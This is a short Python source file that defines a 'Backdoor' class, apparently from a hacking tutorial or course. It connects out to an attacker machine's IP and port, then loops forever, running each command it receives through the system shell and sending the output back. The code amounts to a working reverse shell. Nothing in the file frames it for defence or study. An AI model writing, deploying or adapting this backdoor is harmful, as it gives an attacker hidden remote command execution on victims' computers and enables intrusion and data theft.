#!/usr/bin/env python

import socket
import subprocess

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Implement this for version to be loaded to GitHub, or possibly implement a variable module to be imported
        # kali_ip = input('What is the IP of the attacker machine? \n')
        self.connection.connect((ip, port))

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)

    def run(self):
        while True:
            command = self.connection.recv(1024)
            command_result = self.execute_system_command(str(command)[2:-1])
            self.connection.send(command_result)

        connection.close()